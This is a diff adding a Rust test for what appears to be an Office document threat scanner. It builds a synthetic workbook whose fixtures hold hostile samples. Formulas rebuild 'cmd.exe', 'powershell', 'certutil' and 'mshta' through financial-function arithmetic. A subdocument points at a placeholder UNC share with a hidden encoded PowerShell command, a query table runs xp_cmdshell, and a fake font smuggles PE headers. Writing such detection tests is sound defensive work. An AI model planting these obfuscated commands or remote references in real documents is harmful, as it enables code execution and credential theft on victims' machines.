@@ -7268,3 +7268,195 @@ fn e2e_handout_glossary_customdata_and_amortization_inspection() {
         "JSON missing VBA-CELL-082"
     );
 }
+
+#[test]
+fn e2e_subdoc_fonttable_datafeed_and_chisq_duration_inspection() {
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let package_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <workbookPr codeName="ThisWorkbook"/>
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    // Formulas de-obfuscating threats:
+    // A1: INTRATE(1, 91, 100, 105, 2) = 0.20 -> 0.20 * 495 = 99 ('c') & "md.exe" -> "cmd.exe"
+    // B1: DURATION(0, 360, 0.08, 0.08, 1, 2) = 1.0 -> 1.0 * 112 = 112 ('p') & "owershell" -> "powershell"
+    // C1: CHISQ.DIST(0, 2, FALSE) = 0.5 -> 0.5 * 198 = 99 ('c') & "ertutil" -> "certutil"
+    // D1: INTRATE(1, 91, 100, 105, 2) = 0.20 -> 0.20 * 545 = 109 ('m') & "shta" -> "mshta"
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>=CHAR(INTRATE(1, 91, 100, 105, 2) * 495) &amp; &quot;md.exe&quot;</f></c>
+      <c r="B1"><f>=CHAR(DURATION(0, 360, 0.08, 0.08, 1, 2) * 112) &amp; &quot;owershell&quot;</f></c>
+      <c r="C1"><f>=CHAR(CHISQ.DIST(0, 2, FALSE) * 198) &amp; &quot;ertutil&quot;</f></c>
+      <c r="D1"><f>=CHAR(INTRATE(1, 91, 100, 105, 2) * 545) &amp; &quot;shta&quot;</f></c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    // 1. Word subdocument with remote UNC path and staged command (VBA-CELL-083)
+    let word_subdoc_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:subDoc xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+  target="\\malicious-smb-share\subdocs\exploit.docx">
+  <w:body>
+    <w:p>
+      <w:r>
+        <w:t>powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==</w:t>
+      </w:r>
+    </w:p>
+  </w:body>
+</w:subDoc>"#;
+
+    // 2. PowerPoint font with remote UNC path and smuggled PE binary (VBA-CELL-084)
+    let mut ppt_font_data = vec![0u8; 256];
+    ppt_font_data[0] = b'M';
+    ppt_font_data[1] = b'Z';
+    ppt_font_data[60] = 64; // e_lfanew = 64
+    ppt_font_data[64] = b'P';
+    ppt_font_data[65] = b'E';
+    ppt_font_data[66] = 0;
+    ppt_font_data[67] = 0;
+    let unc_bytes = b"\\\\remote-font-server\\fonts\\stealth_font.fntdata\x00";
+    ppt_font_data[80..80 + unc_bytes.len()].copy_from_slice(unc_bytes);
+
+    // 3. Excel query table with remote UNC destination and database command execution (VBA-CELL-085)
+    let xl_query_table_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<queryTable xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+  name="ExternalQuery" connection="\\remote-sql-server\queries\feed.atom">
+  <queryTableRefresh commandText="EXEC xp_cmdshell 'powershell.exe -enc AAAA'"/>
+</queryTable>"#;
+
+    let cfb = synthesize_cfb("VBAProject", "Module1", "Sub Test()\nEnd Sub\n", &[]);
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", package_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("word/subDocument1.xml", word_subdoc_xml.as_bytes()),
+        ("ppt/fonts/font1.fntdata", ppt_font_data.as_slice()),
+        (
+            "xl/queryTables/queryTable1.xml",
+            xl_query_table_xml.as_bytes(),
+        ),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify Word Subdocument or Master Document threats (VBA-CELL-083)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "WordSubDocumentOrMasterDocumentAnomaly"
+                && (t.coordinate.contains("subDocument:uncCoercion")
+                    || t.coordinate.contains("subDocument:stagedCommand"))
+        ),
+        "Should detect WordSubDocumentOrMasterDocumentAnomaly (VBA-CELL-083): {threats:?}"
+    );
+
+    // 2. Verify PowerPoint Font Table or Embedded Font threats (VBA-CELL-084)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "PowerPointFontTableOrEmbeddedFontAnomaly"
+                && (t.coordinate.contains("pptFontTable:uncCoercion")
+                    || t.coordinate.contains("pptFontTable:smuggledBinary"))
+        ),
+        "Should detect PowerPointFontTableOrEmbeddedFontAnomaly (VBA-CELL-084): {threats:?}"
+    );
+
+    // 3. Verify Excel Query Table or Data Feed threats (VBA-CELL-085)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExcelQueryTableOrDataFeedAnomaly"
+                && (t.coordinate.contains("excelQueryTable:uncCoercion")
+                    || t.coordinate.contains("excelQueryTable:commandInjection"))),
+        "Should detect ExcelQueryTableOrDataFeedAnomaly (VBA-CELL-085): {threats:?}"
+    );
+
+    // 4. Verify dynamic formula de-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("cmd")),
+        "Cell A1 should resolve cmd threat through INTRATE evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through DURATION evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through CHISQ.DIST evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through INTRATE evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-083, VBA-CELL-084, VBA-CELL-085
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/subdoc_fonttable_querytable_chisq_duration.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-083"),
+        "SARIF must contain VBA-CELL-083 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-084"),
+        "SARIF must contain VBA-CELL-084 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-085"),
+        "SARIF must contain VBA-CELL-085 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-083, VBA-CELL-084, VBA-CELL-085
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-083\""),
+        "JSON missing VBA-CELL-083"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-084\""),
+        "JSON missing VBA-CELL-084"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-085\""),
+        "JSON missing VBA-CELL-085"
+    );
+}
